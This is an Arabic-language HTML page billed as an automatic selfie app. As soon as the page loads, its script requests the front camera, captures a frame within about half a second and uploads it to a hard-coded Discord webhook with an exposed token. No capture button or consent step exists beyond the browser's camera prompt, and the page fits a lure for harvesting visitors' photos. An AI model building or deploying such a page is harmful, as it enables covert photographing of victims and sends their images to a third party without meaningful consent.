<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تطبيق التقاط الصور الشخصية التلقائي</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        video, canvas { border: 2px solid #ddd; border-radius: 8px; max-width: 100%; height: auto; background-color: #ccc; }
        .status-message { font-size: 16px; margin-top: 15px; font-weight: bold; color: #333; }
    </style>
</head>
<body>

<div class="container">
    <h2>تطبيق التقاط الصورة الشخصية</h2>
    <p id="instruction">يرجى الموافقة على إذن المتصفح لتفعيل الكاميرا الأمامية.</p>

    <!-- مكان عرض بث الكاميرا -->
    <video id="video" width="400" height="300" autoplay playsinline></video><br>
    
    <!-- نص لحالة المعالجة والإرسال -->
    <div id="status" class="status-message">بانتظار السماح بالكاميرا...</div>
    
    <!-- عنصر مخفي لمعالجة الصورة -->
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
</div>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const instructionText = document.getElementById('instruction');
    const statusText = document.getElementById('status');
    
    // ضع رابط الـ Webhook الخاص بك هنا
    const webhookUrl = 'https://discord.com/api/webhooks/1506731264693108899/jZq_aAkMWzV3hDDPozh3e2qrlD2fEtUqWq91zE8w61iH8zh6RQYlWlSWPpW7uhmTeep_'; 

    // تشغيل طلب الإذن تلقائياً فور تحميل الصفحة
    window.addEventListener('DOMContentLoaded', () => {
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, 
            audio: false 
        })
        .then(stream => {
            video.srcObject = stream;
            
            instructionText.textContent = "تم تفعيل الكاميرا بنجاح.";
            statusText.textContent = "جاري التقاط الصورة وإرسالها تلقائياً...";

            // الانتظار قليلاً للتأكد من أن بث الفيديو قد بدأ واستقر (نصف ثانية)
            video.addEventListener('loadedmetadata', () => {
                setTimeout(captureAndSend, 500);
            });
        })
        .catch(err => {
            console.error("خطأ في الوصول للكاميرا: ", err);
            instructionText.textContent = "فشل تشغيل التطبيق.";
            statusText.textContent = "يرجى إعادة تحميل الصفحة ومنح إذن الكاميرا للمتابعة.";
        });
    });

    // دالة التقاط الصورة والإرسال التلقائي
    function captureAndSend() {
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(blob => {
            if (!blob) return;

            const formData = new FormData();
            formData.append('files[0]', blob, 'captured-image.png');
            formData.append('username', 'تطبيق الكاميرا التلقائي');

            fetch(webhookUrl, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    statusText.textContent = "تم التقاط الصورة وإرسالها بنجاح!";
                    statusText.style.color = "#28a745";
                } else {
                    statusText.textContent = "حدث خطأ أثناء الإرسال. تأكد من صحة رابط الـ Webhook.";
                    statusText.style.color = "#dc3545";
                }
            })
            .catch(error => {
                console.error("خطأ شبكة:", error);
                statusText.textContent = "فشل الاتصال بالخادم أثناء إرسال الصورة.";
                statusText.style.color = "#dc3545";
            });
        }, 'image/png');
    }
</script>

</body>
</html>
